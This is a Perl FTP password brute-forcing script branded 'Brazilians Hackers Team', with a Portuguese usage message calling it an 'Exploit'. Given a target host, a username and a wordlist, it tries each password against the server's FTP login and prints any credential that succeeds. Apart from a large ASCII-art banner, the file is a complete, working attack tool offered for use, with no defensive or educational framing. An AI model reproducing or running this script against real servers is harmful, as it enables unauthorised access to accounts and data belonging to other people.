#!/usr/bin/perl
use Net::FTP;

my $host = $ARGV[0];
my $user = $ARGV[1];
my $wordlist = $ARGV[2];

system('cls'); 

if($#ARGV != 2){
    print         "\n       ▒▒▒▒▒▒▒▓ \n";
        print        "      ▒▒▒▒▒▒▒▓▓▓ \n";
         print       "      ▒▓▓▓▓▓▓░░░▓ \n";
         print       "      ▒▓░░░░▓░░░░▓ \n";
         print       "      ▓░░░░░░▓░▓░▓ \n";
          print      "      ▓░░░░░░▓░░░▓ \n";
         print       "      ▓░░▓░░░▓▓▓▓ \n";
         print       "      ▒▓░░░░▓▒▒▒▒▓ \n";
         print       "      ▒▒▓▓▓▓▒▒▒▒▒▓ \n";
          print      "      ▒▒▒▒▒▒▒▒▓▓▓▓ \n";
         print       "      ▒▒▒▒▒▓▓▓▒▒▒▒▓ \n"; 
         print       "      ▒▒▒▒▓▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▒▓▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▓▒▒▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▓▒▓▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▓▒▓▓▓▓▓▓▓▓▓▓ \n";
         print       "      ▒▓▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▓▒▒▒▒▒▓ \n";
sleep(1);
         print "                      [+] *** Brazilians Hackers Team *** [+]\n";
sleep(1);
print "\t\n";
         print "                       [+]  *** Skype: BrazilObscure *** [+]\n";
print "\t\n";

sleep(1);

print "

         Modo De Usar: ./Exploit <host> <usuario> <wordlist.txt>
";
print "\t\n";
exit;
}

    print         "\n       ▒▒▒▒▒▒▒▓ \n";
        print        "      ▒▒▒▒▒▒▒▓▓▓ \n";
         print       "      ▒▓▓▓▓▓▓░░░▓ \n";
         print       "      ▒▓░░░░▓░░░░▓ \n";
         print       "      ▓░░░░░░▓░▓░▓ \n";
          print      "      ▓░░░░░░▓░░░▓ \n";
         print       "      ▓░░▓░░░▓▓▓▓ \n";
         print       "      ▒▓░░░░▓▒▒▒▒▓ \n";
         print       "      ▒▒▓▓▓▓▒▒▒▒▒▓ \n";
          print      "      ▒▒▒▒▒▒▒▒▓▓▓▓ \n";
         print       "      ▒▒▒▒▒▓▓▓▒▒▒▒▓ \n"; 
         print       "      ▒▒▒▒▓▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▒▓▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▓▒▒▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▓▒▓▒▒▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▓▒▓▓▓▓▓▓▓▓▓▓ \n";
         print       "      ▒▓▒▒▒▒▒▒▒▓ \n";
         print       "      ▒▒▓▒▒▒▒▒▓ \n";
sleep(1);
         print "                      [+] *** Brazilians Hackers Team *** [+]\n";
sleep(1);
print "\t\n";
         print "                       [+]  *** Skype: BrazilObscure *** [+]\n";
print "\t\n";

sleep(1);
print "\t\n";
print "[*] HOST: $host\n\n[*] USUARIO: $user\n\n\n";

open(a,"<$wordlist");
@password = <a>;
$b = scalar(@password);
for($a>0;$a<$b;$a++){

$number += 1;
chomp($password2 = $password[$a]);
my $f = Net::FTP->new($host) or die "$!";
if(!$f->login($user, $password2)){
print "[*] $host:21 - [$number/$b] Testando Senha ... $password2\n";
$f->quit;
} else {
print "[*] $host:21 - [$number/$b] Testando Senha... $password2\n";
print "\t\n";
print "[+] Senha Encontrada! \n";
print "\t\n";
print "[*] Usuario: $user Senha: $password2\n\n";
exit;
}

}
print "\n[-] Senha Nao Encontrada :/\n";
exit;